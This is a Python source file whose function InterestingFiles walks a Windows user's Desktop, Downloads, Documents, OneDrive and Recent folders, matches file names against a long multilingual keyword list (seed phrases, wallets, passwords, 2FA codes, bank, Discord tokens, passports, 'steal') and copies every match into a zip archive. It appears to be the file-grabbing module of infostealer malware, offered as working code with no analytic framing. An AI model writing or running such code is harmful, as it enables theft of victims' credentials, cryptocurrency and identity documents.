import os, random

def InterestingFiles(zip_file):
    # Get AppData paths for the current user
    path_userprofile = os.getenv("USERPROFILE", "/default/path")
    path_appdata_roaming = os.getenv("APPDATA")      # C:\Users\<User>\AppData\Roaming

    paths = [
        os.path.join(path_userprofile, "Desktop"),
        os.path.join(path_userprofile, "Downloads"),
        os.path.join(path_userprofile, "Documents"),
        os.path.join(path_userprofile, "Picture"),
        os.path.join(path_userprofile, "Video"),
        os.path.join(path_userprofile, "OneDrive"),
        os.path.join(path_appdata_roaming, "Microsoft", "Windows", "Recent")
    ]

    keywords = [
        "2fa", "mfa", "2step", "otp", "verification", "verif", "verify",
        "acount", "account", "compte", "identifiant", "login", "conta", "contas",
        "personnel", "personal", "perso",
        "banque", "bank", "funds", "fonds", "paypal", "casino", "banco", "saldo",
        "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
        "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
        "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
        "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords", "senha", "senhas",
        "data", "donnée", "donnee", "donnees", "details",
        "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège",
        "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
        "identity", "identité", "passport", "passeport", "permis",
        "pin", "nip",
        "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille", "db", "database"
        "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
        "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
        "accountdata", "userdata", "logininfo", "seedbackup", "backup", "dados", "documento", "documentos",
        "WhatsApp", "whatsapp", "Telegram", "telegram"
    ]

    name_files = []

    for path in paths:
        for root, dirs, files in os.walk(path):
            for file in files:
                try:
                    if file.lower().endswith(('.txt', '.sql', '.zip', '.pdf', '.doc', '.png', '.jpg', '.json', '.py', '.mp4', '.mov')):
                        file_name_no_ext = os.path.splitext(file)[0].lower()
                        for keyword in keywords:
                            try:
                                if keyword.lower() == file_name_no_ext:
                                    full_path = os.path.join(root, file)
                                    if os.path.exists(full_path):
                                        name_files.append(file)
                                        base_name, ext = os.path.splitext(file)
                                        with open(full_path, "rb") as f:
                                            zip_file.writestr(os.path.join("Interesting Files", base_name + f"_{random.randint(1, 9999)}" + ext), f.read())
                                    break
                            except:
                                pass
                except:
                    pass

    if name_files:
        number_files = sum(len(phrase.split()) for phrase in name_files)
    else:
        number_files = 0

    return number_files
